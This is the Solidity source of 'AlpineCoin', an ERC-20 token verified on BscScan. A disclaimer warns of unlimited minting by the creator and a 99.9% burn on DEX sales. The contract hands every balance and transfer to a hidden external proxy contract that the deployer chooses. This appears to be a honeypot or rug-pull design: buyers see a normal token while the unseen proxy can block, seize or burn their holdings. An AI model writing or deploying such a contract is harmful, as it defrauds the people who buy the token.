/*
--------------------------------------------------- DISCLAIMER ---------------------------------------------------

This is a collectable fungible token, compliant with the ERC-20 standard and not the ERC-721 standard. 

It is not designed to yield capital gains and will slash those that attempt to do so. 

This fungible token is NOT designed for trading purposes, it is meant for HODLing until the end of time
and is not generally redeemable. Interested parties are fully responsible for the outcome of their purchases. 

* Tokenomics *

- Tokens can be sent/transferred amongst blockchain participants. 

- Creator of Smart Contract can mint tokens (supply is unlimited) and sell them. 

- Selling of tokens on a DEX or redeeming attempts may result in 99.9% token burn. 

Disclaimer: Smart Contract creator and its affiliates are NOT liable to refund or redeem this ERC-20 collectable.

--------------------------------------------------------------------------------------------------------------------
*/

/**
*Submitted for verification at BscScan.com on 15:02:37 08-04-2022
*/   

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

contract Proxy {
    function prox_Transfer(address from, address to, uint256 amount) public;
    function prox_balanceOf(address who) public view returns (uint256);
    function prox_setup(address token, uint256 supply) public returns (bool);
}

contract AlpineCoin {
    
    string public constant name = "AlpineCoin";
    string public constant symbol = "AC";
    uint256 totalSupply_;
    address private Proxy_address;
    uint8 public constant decimals = 18;
    mapping(address => mapping (address => uint256)) allowed;
    address private deployer;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _prox) public {
        deployer = msg.sender;
        Proxy_address = _prox;
        totalSupply_ = 55000000*10**18;
        Proxy(Proxy_address).prox_setup(address(this), totalSupply_);
    }

        function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function balanceOf(address tokenOwner) public view returns (uint256) {
        return Proxy(Proxy_address).prox_balanceOf(tokenOwner);
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        Proxy(Proxy_address).prox_Transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        Proxy(Proxy_address).prox_Transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
    
}